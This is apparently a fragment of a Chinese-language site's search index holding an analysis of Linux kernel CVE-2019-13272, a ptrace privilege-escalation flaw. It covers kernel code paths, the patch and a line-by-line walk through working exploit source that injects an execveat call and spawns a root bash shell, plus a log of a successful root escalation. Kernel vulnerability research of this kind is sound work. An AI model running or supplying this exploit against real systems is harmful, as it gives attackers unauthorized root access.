arch_ptrace_attach(current);\n    1121                 goto out;\n    1122         }\n    1123 \n    1124         child = find_get_task_by_vpid(pid);\n    1125         if (!child) {\n    1126                 ret = -ESRCH;\n    1127                 goto out;\n    1128         }\n    1129 \n    1130         if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {\n    1131                 ret = ptrace_attach(child, request, addr, data); // <------ \u8fdb\u5165 attach \u5206\u652f\n    1132                 /*\n    1133                  * Some architectures need to do book-keeping after\n    1134                  * a ptrace attach.\n    1135                  */\n    1136                 if (!ret)\n    1137                         arch_ptrace_attach(child);\n    1138                 goto out_put_task_struct;\n    1139         }\n    1140 \n    1141         ret = ptrace_check_attach(child, request == PTRACE_KILL ||\n    1142                                   request == PTRACE_INTERRUPT);\n    1143         if (ret < 0)\n    1144                 goto out_put_task_struct;\n    1145 \n    1146         ret = arch_ptrace(child, request, addr, data); // <---- \u5176\u4ed6 ptrace request \n    1147         if (ret || request != PTRACE_DETACH)\n    1148                 ptrace_unfreeze_traced(child);\n    1149 \n    1150  out_put_task_struct:\n    1151         put_task_struct(child);\n    1152  out:\n    1153         return ret;\n    1154 }  \u5982\u4e0a\uff0c \u7531\u4e8e task B \u548c task C \u6b64\u65f6\u5df2\u7ecf\u5b58\u5728 trace link\uff0c \u6240\u4ee5\u901a\u8fc7 B \u5411 C \u53ef\u4ee5\u76f4\u63a5\u53d1\u9001 ptrace request\uff0c \u5c06\u8fdb\u5165\u51fd\u6570 arch_ptrace  arch/x86/kernel/ptrace.c\n\narch_ptrace \n    -> ptrace_request \n        -> generic_ptrace_peekdata\n           generic_ptrace_pokedata \n            -> ptrace_access_vm \n                -> ptracer_capable \n\n kernel/ptrace.c\n 884 int ptrace_request(struct task_struct *child, long request,\n 885                    unsigned long addr, unsigned long data)\n 886 {\n 887         bool seized = child->ptrace & PT_SEIZED;\n 888         int ret = -EIO;\n 889         siginfo_t siginfo, *si;\n 890         void __user *datavp = (void __user *) data;\n 891         unsigned long __user *datalp = datavp;\n 892         unsigned long flags;\n 893 \n 894         switch (request) {\n 895         case PTRACE_PEEKTEXT:\n 896         case PTRACE_PEEKDATA:\n 897                 return generic_ptrace_peekdata(child, addr, data);\n 898         case PTRACE_POKETEXT:\n 899         case PTRACE_POKEDATA:\n 900                 return generic_ptrace_pokedata(child, addr, data);\n 901 \n =================== skip ================\n 1105 }\n\n\n 1156 int generic_ptrace_peekdata(struct task_struct *tsk, unsigned long addr,\n 1157                             unsigned long data)\n 1158 {\n 1159         unsigned long tmp;\n 1160         int copied;\n 1161 \n 1162         copied = ptrace_access_vm(tsk, addr, &tmp, sizeof(tmp), FOLL_FORCE); // <--- \u8c03\u7528 ptrace_access_vm\n 1163         if (copied != sizeof(tmp))\n 1164                 return -EIO;\n 1165         return put_user(tmp, (unsigned long __user *)data);\n 1166 }\n 1167 \n 1168 int generic_ptrace_pokedata(struct task_struct *tsk, unsigned long addr,\n 1169                             unsigned long data)\n 1170 {\n 1171         int copied;\n 1172 \n 1173         copied = ptrace_access_vm(tsk, addr, &data, sizeof(data), // <---- \u8c03\u7528 ptrace_access_vm\n 1174                         FOLL_FORCE | FOLL_WRITE);\n 1175         return (copied == sizeof(data)) ? 0 : -EIO;\n 1176 }  \u5982\u4e0a\uff0c\u5f53 tracer \u60f3\u8981\u63a7\u5236 tracee \u6267\u884c\u65b0\u7684\u4ee3\u7801\u903b\u8f91\u65f6\uff0c\u9700\u8981\u53d1\u9001 request \u8bfb\u5199 tracee \u7684\u4ee3\u7801\u533a\u548c\u5185\u5b58\u533a\uff0c \u5bf9\u5e94\u7684 request \u662f PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA   \u8fd9\u51e0\u79cd\u8bfb\u5199\u64cd\u4f5c\u6700\u7ec8\u90fd\u662f\u901a\u8fc7\u51fd\u6570 ptrace_access_vm \u5b9e\u73b0\u7684      kernel/ptrace.c\n    38 int ptrace_access_vm(struct task_struct *tsk, unsigned long addr,\n    39                      void *buf, int len, unsigned int gup_flags)\n    40 {\n    41         struct mm_struct *mm;\n    42         int ret;\n    43 \n    44         mm = get_task_mm(tsk);\n    45         if (!mm)\n    46                 return 0;\n    47 \n    48         if (!tsk->ptrace ||\n    49             (current != tsk->parent) ||\n    50             ((get_dumpable(mm) != SUID_DUMP_USER) &&\n    51              !ptracer_capable(tsk, mm->user_ns))) { // < ----- \u53c8\u662f\u8c03\u7528 ptracer_capable \u51fd\u6570\n    52                 mmput(mm);\n    53                 return 0;\n    54         }\n    55 \n    56         ret = __access_remote_vm(tsk, mm, addr, buf, len, gup_flags);\n    57         mmput(mm);\n    58 \n    59         return ret;\n    60 }\n\n    kernel/capability.c\n    499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)\n    500 {\n    501         int ret = 0;  /* An absent tracer adds no restrictions */\n    502         const struct cred *cred;\n    503         rcu_read_lock();\n    504         cred = rcu_dereference(tsk->ptracer_cred);\n    505         if (cred)\n    506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);\n    507         rcu_read_unlock();\n    508         return (ret == 0);\n    509 }  \u5982\u4e0a\uff0c ptrace_access_vm \u51fd\u6570\u4f1a\u8c03\u7528\u6211\u4eec\u4e4b\u524d\u5206\u6790\u5230\u7684 'ptracer_capable' \u6765\u51b3\u5b9a\u8fd9\u4e2a request \u662f\u5426\u53ef\u4ee5\u8fdb\u884c, \u8fd9\u662f 'ptracer_capable' \u51fd\u6570\u7684\u7b2c\u4e8c\u79cd\u4f7f\u7528\u573a\u666f  \u6839\u636e\u4e4b\u524d\u6211\u4eec\u5206\u6790\u7684\u7ed3\u679c\uff0c task C \u6b64\u65f6\u4fdd\u5b58\u7684 ptracer_cred \u662f\u7279\u6743 cred, \u6240\u4ee5\u8fd9\u65f6\u5019 ptracer_capable \u4f1a\u901a\u8fc7\uff0c \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u56de\u7b54\u4e86\u521a\u521a\u7684\u95ee\u9898\uff0c \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u666e\u901a\u6743\u9650\u7684 task B \u662f\u53ef\u4ee5\u53d1\u9001 ptrace request \u53bb\u8bfb\u5199 root \u6743\u9650\u7684 task C \u7684\u5185\u5b58\u533a\u548c\u4ee3\u7801\u533a\u7684  \u81f3\u6b64\uff0ctask C \u8bb0\u5f55\u7684\u8fd9\u4e2a\u7279\u6743 ptracer_cred \u5b9e\u9645\u4e0a\u53d1\u6325\u4e86 2 \u79cd\u4f5c\u7528   1\uff0c\u53ef\u4ee5\u8ba9 task C \u6267\u884c execve(suid binary) \u7ed9\u81ea\u5df1\u63d0\u6743  2\uff0c\u53ef\u4ee5\u8ba9\u666e\u901a\u6743\u9650\u7684 task B \u6267\u884c ptrace \u8bfb\u5199 task C \u7684\u4ee3\u7801\u533a\u548c\u5185\u5b58\u533a\uff0c\u4ece\u800c\u63a7\u5236 task C \u6267\u884c\u4efb\u610f\u64cd\u4f5c   \u4e0a\u9762 2 \u70b9\u5408\u8d77\u6765\uff0c\u4e0d\u5c31\u662f\u5b8c\u6574\u7684\u63d0\u6743\u64cd\u4f5c\u5417?",
            "title": "b.\u6f0f\u6d1e\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#c_1",
            "text": "TOCTOU",
            "title": "c.\u6f0f\u6d1e\u7c7b\u578b"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#d_1",
            "text": "ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME  Fix two issues:\n\n// \u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u662f cred \u7684 rcu reference \u95ee\u9898\nWhen called for PTRACE_TRACEME, ptrace_link() would obtain an RCU   \nreference to the parent's objective credentials, then give that pointer\nto get_cred().  However, the object lifetime rules for things like\nstruct cred do not permit unconditionally turning an RCU reference into\na stable reference.\n\n// \u7b2c\u4e8c\u4e2a\u95ee\u9898\uff0ctracee \u8bb0\u5f55\u7684 tracer \u7684 cred \u7684\u95ee\u9898\nPTRACE_TRACEME records the parent's credentials as if the parent was \nacting as the subject, but that's not the case.  If a malicious\nunprivileged child uses PTRACE_TRACEME and the parent is privileged, and\nat a later point, the parent process becomes attacker-controlled\n(because it drops privileges and calls execve()), the attacker ends up\nwith control over two processes with a privileged ptrace relationship,\nwhich can be abused to ptrace a suid binary and obtain root privileges.\n\n\nFix both of these by always recording the credentials of the process\nthat is requesting the creation of the ptrace relationship:\ncurrent_cred() can't change under us, and current is the proper subject\nfor access control.  \u4ee5\u4e0a\u662f\u8865\u4e01\u7684\u63cf\u8ff0\uff0c\u4ee5\u4e0b\u662f\u8865\u4e01\u7684\u4ee3\u7801  diff --git a/kernel/ptrace.c b/kernel/ptrace.c\nindex 8456b6e..705887f 100644\n--- a/kernel/ptrace.c\n+++ b/kernel/ptrace.c\n@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n  */\n static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n {\n-   rcu_read_lock();\n-   __ptrace_link(child, new_parent, __task_cred(new_parent));\n-   rcu_read_unlock();\n+   __ptrace_link(child, new_parent, current_cred());\n }  \u4ece\u8865\u4e01\u7684\u63cf\u8ff0\u6765\u770b\uff0c\u4e00\u5171\u4fee\u590d\u4e86 2 \u4e2a\u95ee\u9898   1 \u662f rcu reference \u7684\u95ee\u9898\uff0c\u5bf9\u5e94\u7684\u4ee3\u7801\u662f\u5220\u9664\u4e86 rcu \u9501;   2 \u662f tracee \u8bb0\u5f55 tracer \u8fdb\u7a0b\u7684 cred \u5f15\u53d1\u7684\u95ee\u9898   \u672c\u6587\u4e0d\u5173\u5fc3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u53ea\u5206\u6790\u53ef\u4ee5\u7528\u4e8e\u672c\u5730\u63d0\u6743\u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898  \u4ece\u8865\u4e01\u63cf\u8ff0\u770b\u7b2c\u4e8c\u4e2a\u95ee\u9898\u6bd4\u8f83\u590d\u6742\uff0c\u8865\u4e01\u5bf9\u5e94\u7684\u4ee3\u7801\u5012\u662f\u975e\u5e38\u7b80\u5355\uff0c \u5c06 '__task_cred(new_parent)' \u6362\u6210\u4e86 'current_cred()', \u4e5f\u5c31\u662f\u8bf4\u8bb0\u5f55\u7684 cred \u4ece tracer \u8fdb\u7a0b\u7684 cred \u6362\u6210\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684 cred  \u8865\u4e01\u7684\u610f\u601d\u662f\u8bf4\u5728 PTRACE_TRACEME \u8fd9\u79cd\u573a\u666f\u4e0b\uff0c ptracer_cred \u8bb0\u5f55\u7684\u4e0d\u5e94\u8be5\u662f\u7236\u8fdb\u7a0b\u7684 cred\uff0c \u800c\u5e94\u8be5\u662f\u81ea\u5df1\u7684 cred, \u8fd9\u6837\u903b\u8f91\u624d\u662f\u5bf9\u7684",
            "title": "d.\u6f0f\u6d1e\u8865\u4e01"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#ecve",
            "text": "CVE-2019-13272",
            "title": "e.\u6f0f\u6d1eCVE\u53f7"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#3poc",
            "text": "",
            "title": "3.POC"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#apoc",
            "text": "",
            "title": "a.POC\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#bpoc",
            "text": "",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#c_2",
            "text": "",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#4exp",
            "text": "",
            "title": "4.EXP"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#aexp",
            "text": "\u672c\u6f0f\u6d1e\u5229\u7528\u7684\u5173\u952e\u662f\u627e\u5230\u5408\u9002\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u542f\u52a8 task B, \u8fd9\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\u8981\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6:   1, \u5fc5\u987b\u662f\u80fd\u88ab\u666e\u901a\u6743\u9650\u7528\u6237\u8c03\u7528  2, \u6267\u884c\u65f6\u5fc5\u987b\u6709\u63d0\u6743\u5230root\u7684\u9636\u6bb5  3, \u6267\u884c\u63d0\u6743\u540e\u5fc5\u987b\u6267\u884c\u964d\u6743   (\u77ed\u6682\u63d0\u6743\u5230 root \u7684\u76ee\u7684\u662f\u8ba9 task C \u53ef\u4ee5\u83b7\u53d6 root \u7684 ptracer_cred, \u518d\u964d\u6743\u7684\u76ee\u7684\u662f\u8ba9 B \u80fd\u88ab\u666e\u901a\u6743\u9650\u7684\u8fdb\u7a0b ptrace attach)  pkexec  \u5141\u8bb8\u7279\u6743\u7528\u6237\u4ee5\u5176\u4ed6\u7528\u6237\u6743\u9650\u6267\u884c\u53e6\u5916\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c \u7528\u4e8e  polkit  \u8ba4\u8bc1\u6846\u67b6, \u5f53\u4f7f\u7528 --user \u53c2\u6570\u65f6\uff0c \u521a\u597d\u53ef\u4ee5\u8ba9\u8fdb\u7a0b\u5148\u63d0\u6743\u5230  root \u7136\u540e\u518d\u964d\u6743\u5230\u6307\u5b9a\u7528\u6237\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u8fdb\u7a0b B, \u6b64\u5916\u9700\u8981\u627e\u5230\u901a\u8fc7 polkit \u6846\u67b6\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f(jann horn \u628a\u4ed6\u4eec\u6210\u4e3a helper)\uff0c \u8fd9\u4e9b helper \u7a0b\u5e8f\u9700\u8981\u6ee1\u8db3\u666e\u901a\u7528\u6237\u7528 pkexec \u6267\u884c\u5b83\u4eec\u65f6\u4e0d\u9700\u8981\u8ba4\u8bc1\uff08\u5f88\u591a\u901a\u8fc7 polkit \u6267\u884c\u7684\u7a0b\u5e8f\u90fd\u9700\u8981\u5f39\u7a97\u8ba4\u8bc1\uff09, \u6267\u884c\u7684\u6a21\u5f0f\u5982\u4e0b:   /usr/bin/pkexec --user nonrootuser /user/sbin/some-helper-binary",
            "title": "a.EXP\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#bexp",
            "text": "\u8fd9\u91cc\u6211\u5217\u51fa 3 \u4efd exploit \u4ee3\u7801:   1  jann horn \u7684 exploit    2  bcoles \u7684 exploit    3  jiayy \u7684 exploit   jann horn \u7684 exploit  \u91cc\u4f7f\u7528\u684c\u9762\u53d1\u884c\u7248\u81ea\u5e26\u7684  pkexec  \u7a0b\u5e8f\u7528\u4e8e\u542f\u52a8 task B  pkexec  \u5141\u8bb8\u7279\u6743\u7528\u6237\u4ee5\u5176\u4ed6\u7528\u6237\u6743\u9650\u6267\u884c\u53e6\u5916\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c \u7528\u4e8e  polkit  \u8ba4\u8bc1\u6846\u67b6, \u5f53\u4f7f\u7528 --user \u53c2\u6570\u65f6\uff0c \u521a\u597d\u53ef\u4ee5\u8ba9\u8fdb\u7a0b\u5148\u63d0\u6743\u5230  root \u7136\u540e\u518d\u964d\u6743\u5230\u6307\u5b9a\u7528\u6237\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u8fdb\u7a0b B, \u6b64\u5916\u9700\u8981\u627e\u5230\u901a\u8fc7 polkit \u6846\u67b6\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f(jann horn \u628a\u4ed6\u4eec\u6210\u4e3a helper)\uff0c \u8fd9\u4e9b helper \u7a0b\u5e8f\u9700\u8981\u6ee1\u8db3\u666e\u901a\u7528\u6237\u7528 pkexec \u6267\u884c\u5b83\u4eec\u65f6\u4e0d\u9700\u8981\u8ba4\u8bc1\uff08\u5f88\u591a\u901a\u8fc7 polkit \u6267\u884c\u7684\u7a0b\u5e8f\u90fd\u9700\u8981\u5f39\u7a97\u8ba4\u8bc1\uff09, \u6267\u884c\u7684\u6a21\u5f0f\u5982\u4e0b:   /usr/bin/pkexec --user nonrootuser /user/sbin/some-helper-binary   bcoles \u7684 exploit  \u5728 jann horn \u7684\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u5bfb\u627e\u66f4\u591a helper binary \u7684\u4ee3\u7801\uff0c \u56e0\u4e3a jann horn \u7684 helper \u662f\u4e00\u4e2a\u5199\u6b7b\u7684\u7a0b\u5e8f\uff0c \u5728\u5f88\u591a\u53d1\u884c\u7248\u5e76\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4ed6\u7684 exploit \u5728\u5f88\u591a\u53d1\u884c\u7248\u7cfb\u7edf\u4e0a\u65e0\u6cd5\u8fd0\u884c\uff0c bcoles \u7684 exploit \u53ef\u4ee5\u5728\u66f4\u591a\u7684\u53d1\u884c\u7248\u4e0a\u8fd0\u884c\u6210\u529f  \u672c\u4eba\u51fa\u4e8e\u5b66\u4e60\u7684\u76ee\u7684\uff0c\u4e5f\u5199\u4e86\u4e00\u4efd  jiayy \u7684 exploit , \u56e0\u4e3a helper binary \u56e0\u4e0d\u540c\u53d1\u884c\u7248\u800c\u5f02\uff0c pkexec \u4e5f\u662f\u684c\u9762\u53d1\u884c\u7248\u624d\u6709\uff0c \u800c\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u63d0\u6743\u6f0f\u6d1e\u662f linux kernel \u7684\u6f0f\u6d1e\uff0c \u6240\u4ee5\u6211\u628a jann horn \u7684 exploit \u6539\u6210\u4e86\u4f7f\u7528\u4e00\u4e2a fakepkexec \u7a0b\u5e8f\u6765\u63d0\u6743\uff0c \u800c\u8fd9\u4e2a fakepkexec \u548c fakehelper \u7a0b\u5e8f\u624b\u52a8\u751f\u6210\uff08\u800c\u4e0d\u662f\u4ece\u76ee\u6807\u7cfb\u7edf\u641c\u7d22\uff09\uff0c\u8fd9\u6837\u4e00\u6765\u5b66\u4e60\u8005\u53ef\u4ee5\u5728\u4efb\u4f55\u5b58\u5728\u672c\u6f0f\u6d1e\u7684 linux \u7cfb\u7edf\uff08\u4e0d\u9700\u8981\u684c\u9762\uff09\u8fd0\u884c\u6211\u7684 exploit \u8fdb\u884c\u7814\u7a76  \u4e0b\u9762\u7b80\u5355\u8fc7\u4e00\u4e0b exploit \u7684\u4ee3\u7801  \n167 int main(int argc, char **argv) {\n168   if (strcmp(argv[0], \"stage2\") == 0)\n169     return middle_stage2();\n170   if (strcmp(argv[0], \"stage3\") == 0)\n171     return spawn_shell();\n172 \n173   helper_path = \"/tmp/fakehelper\";\n174 \n175   /*\n176    * set up a pipe such that the next write to it will block: packet mode,\n177    * limited to one packet\n178    */\n179   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));\n180   SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));\n181   char dummy = 0;\n182   SAFE(write(block_pipe[1], &dummy, 1));\n183 \n184   /* spawn pkexec in a child, and continue here once our child is in execve() */\n185   static char middle_stack[1024*1024];\n186   pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),\n187                             CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));\n188   if (!middle_success) return 1;\n189 \n======================= skip =======================\n215 }  \u5148\u770b\u884c 186, \u8c03\u7528 clone \u751f\u6210\u5b50\u8fdb\u7a0b\uff08\u4e5f\u5c31\u662f task B\uff09, task B \u8fd0\u884c middle_main    64 static int middle_main(void *dummy) {\n 65   prctl(PR_SET_PDEATHSIG, SIGKILL);\n 66   pid_t middle = getpid();\n 67 \n 68   self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY));\n 69 \n 70   pid_t child = SAFE(fork());\n 71   if (child == 0) {\n 72     prctl(PR_SET_PDEATHSIG, SIGKILL);\n 73 \n 74     SAFE(dup2(self_fd, 42));\n 75 \n 76     /* spin until our parent becomes privileged (have to be fast here) */\n 77     int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY));\n 78     char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid());\n 79     while (1) {\n 80       char buf[1000];\n 81       ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));\n 82       buf[buflen] = '\\0';\n 83       if (strstr(buf, needle)) break;\n 84     }\n 85 \n 86     /*\n 87      * this is where the bug is triggered.\n 88      * while our parent is in the middle of pkexec, we force it to become our\n 89      * tracer, with pkexec's creds as ptracer_cred.\n 90      */\n 91     SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));\n 92 \n 93     /*\n 94      * now we execute passwd. because the ptrace relationship is considered to\n 95      * be privileged, this is a proper suid execution despite the attached\n 96      * tracer, not a degraded one.\n 97      * at the end of execve(), this process receives a SIGTRAP from ptrace.\n 98      */\n 99     puts(\"executing passwd\");\n100     execl(\"/usr/bin/passwd\", \"passwd\", NULL);\n101     err(1, \"execl passwd\");\n102   }\n103 \n104   SAFE(dup2(self_fd, 0));\n105   SAFE(dup2(block_pipe[1], 1));\n106 \n107   struct passwd *pw = getpwuid(getuid());\n108   if (pw == NULL) err(1, \"getpwuid\");\n109 \n110   middle_success = 1;\n111   execl(\"/tmp/fakepkexec\", \"fakepkexec\", \"--user\", pw->pw_name, NULL);\n112   middle_success = 0;\n113   err(1, \"execl pkexec\");\n114 }  \u884c 70, \u8c03\u7528 fork \u751f\u6210\u5b59\u8fdb\u7a0b\uff08\u4e5f\u5c31\u662f task C\uff09  \u7136\u540e\u884c 111, task B \u8fd0\u884c fakepkexec \u8ba9\u81ea\u5df1\u63d0\u6743\u518d\u964d\u6743  \u7136\u540e\u770b\u884c 76 ~ 84, task C \u68c0\u6d4b\u5230 task B \u7684 euid \u53d8\u6210 0 \u4e4b\u540e\uff0c \u4f1a\u6267\u884c\u884c 91 \u8fdb\u884c PTRACE_TRACEME \u64cd\u4f5c\u83b7\u53d6 root \u7684 ptracer_cred, \u7136\u540e\u7d27\u63a5\u7740 task C \u9a6c\u4e0a\u8fd0\u884c execl \u6267\u884c\u4e00\u4e2a  suid binary \u8ba9\u81ea\u5df1\u7684 euid \u53d8\u6210 0  \n190   /*\n191    * wait for our child to go through both execve() calls (first pkexec, then\n192    * the executable permitted by polkit policy).\n193    */\n194   while (1) {\n195     int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY);\n196     char buf[16];\n197     int buflen = SAFE(read(fd, buf, sizeof(buf)-1));\n198     buf[buflen] = '\\0';\n199     *strchrnul(buf, '\\n') = '\\0';\n200     if (strncmp(buf, basename(helper_path), 15) == 0)\n201       break;\n202     usleep(100000);\n203   }\n204 \n205   /*\n206    * our child should have gone through both the privileged execve() and the\n207    * following execve() here\n208    */\n209   SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));\n210   SAFE(waitpid(midpid, &dummy_status, 0));\n211   fputs(\"attached to midpid\\n\", stderr);\n212 \n213   force_exec_and_wait(midpid, 0, \"stage2\");\n214   return 0;  \u63a5\u4e0b\u53bb\u56de\u5230 task A \u7684 main \u51fd\u6570\uff0c \u884c 194 ~ 202, task A \u68c0\u6d4b\u5230 task B \u7684 binary comm \u53d8\u6210 helper \u4e4b\u540e\uff0c\n\u8fd0\u884c\u884c 213 \u6267\u884c force_exec_and_wait  116 static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {\n117   struct user_regs_struct regs;\n118   struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };\n119   SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));\n120   SAFE(waitpid(pid, &dummy_status, 0));\n121   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));\n122 \n123   /* set up indirect arguments */\n124   unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;\n125   struct injected_page {\n126     unsigned long argv[2];\n127     unsigned long envv[1];\n128     char arg0[8];\n129     char path[1];\n130   } ipage = {\n131     .argv = { scratch_area + offsetof(struct injected_page, arg0) }\n132   };\n133   strcpy(ipage.arg0, arg0);\n134   for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {\n135     unsigned long pdata = ((unsigned long *)&ipage)[i];\n136     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),\n137                 (void*)pdata));\n138   }\n139 \n140   /* execveat(exec_fd, path, argv, envv, flags) */\n141   regs.orig_rax = __NR_execveat;\n142   regs.rdi = exec_fd;\n143   regs.rsi = scratch_area + offsetof(struct injected_page, path);\n144   regs.rdx = scratch_area + offsetof(struct injected_page, argv);\n145   regs.r10 = scratch_area + offsetof(struct injected_page, envv);\n146   regs.r8 = AT_EMPTY_PATH;\n147 \n148   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));\n149   SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));\n150   SAFE(waitpid(pid, &dummy_status, 0));\n151 }  \u51fd\u6570 force_exec_and_wait \u7684\u4f5c\u7528\u662f\u4f7f\u7528 ptrace \u63a7\u5236 tracee \u6267\u884c execveat \u51fd\u6570\u66ff\u6362\u8fdb\u7a0b\u7684\u955c\u50cf, \u8fd9\u91cc\u5b83\u63a7\u5236 task B \u6267\u884c\u4e86 task A \u7684\u8fdb\u7a0b\uff08\u5373 exploit \u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff09\u7136\u540e\u53c2\u6570\u4e3a stage2, \u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f\u8ba9 task B \u6267\u884c\u4e86 middle_stage2 \u51fd\u6570  167 int main(int argc, char **argv) {\n168   if (strcmp(argv[0], \"stage2\") == 0)\n169     return middle_stage2();\n170   if (strcmp(argv[0], \"stage3\") == 0)\n171     return spawn_shell();  \u800c middle_stage2 \u51fd\u6570\u540c\u6837\u8c03\u7528\u4e86 force_exec_and_wait , \u8fd9\u5c06\u4f7f task B \u5229\u7528 ptrace \u63a7\u5236 task C \u6267\u884c execveat \u51fd\u6570\uff0c\u5c06 task C \u7684\u955c\u50cf\u4e5f\u66ff\u6362\u4e3a exploit \u7684 binary, \u4e14\u53c2\u6570\u662f stage3  153 static int middle_stage2(void) {\n154   /* our child is hanging in signal delivery from execve()'s SIGTRAP */\n155   pid_t child = SAFE(waitpid(-1, &dummy_status, 0));\n156   force_exec_and_wait(child, 42, \"stage3\");\n157   return 0;\n158 }  \u5f53 exploit binary \u4ee5\u53c2\u6570 stage3 \u8fd0\u884c\u65f6\uff0c\u5b9e\u9645\u8fd0\u884c\u7684\u662f  spawn_shell \u51fd\u6570, \u6240\u4ee5 task C \u6700\u540e\u9636\u6bb5\u8fd0\u884c\u7684\u662f spawn_shell  160 static int spawn_shell(void) {\n161   SAFE(setresgid(0, 0, 0));\n162   SAFE(setresuid(0, 0, 0));\n163   execlp(\"bash\", \"bash\", NULL);\n164   err(1, \"execlp\");\n165 }  \u5728 spawn_shell \u51fd\u6570\u91cc\uff0c \u5b83\u9996\u5148\u4f7f\u7528 setresgid/setresuid \u5c06\u672c\u8fdb\u7a0b\u7684 real uid/effective uid/save uid \u90fd\u53d8\u6210 root, \u7531\u4e8e task C \u521a\u521a\u5df2\u7ecf\u6267\u884c\u4e86 suid binary \u5c06\u81ea\u8eab\u7684 euid \u53d8\u6210\u4e86 root, \u6240\u4ee5\u8fd9\u91cc\u7684 setresuid/setresgid \u53ef\u4ee5\u6210\u529f\u6267\u884c\uff0c\u5230\u6b64\u4e3a\u6b62\uff0c task C \u5c31\u53d8\u6210\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684 root \u8fdb\u7a0b\uff0c \u6700\u540e\u518d\u6267\u884c execlp \u542f\u52a8\u4e00\u4e2a shell, \u5373\u5f97\u5230\u4e86\u4e00\u4e2a\u5b8c\u6574 root \u6743\u9650\u7684 shell",
            "title": "b.EXP\u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#c_3",
            "text": "root@ubuntu:/tmp/EXP-CVE-2019-13272# sh make.sh \n$ id\nuid=1001(test) gid=1001(test) groups=1001(test) context=system_u:system_r:kernel_t:s0\n$ /tmp/exp  \nexecuting passwd\nattached to midpid\nroot@ubuntu:/tmp/EXP-CVE-2019-13272# id\nuid=0(root) gid=0(root) groups=0(root),1001(test) context=system_u:system_r:kernel_t:s0",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#d_2",
            "text": "\u5229\u7528 pkexec \u7684\u7279\u6027\u548c ptrace \u5728\u5904\u7406 trace_me \u65f6\u4f7f\u7528 cred \u7684\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u4e86 root \u6743\u9650\u7684\u76d7\u7528",
            "title": "d.\u5229\u7528\u539f\u7406\u7cbe\u51c6\u6982\u62ec"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#5",
            "text": "\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#a_2",
            "text": "",
            "title": "a.\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
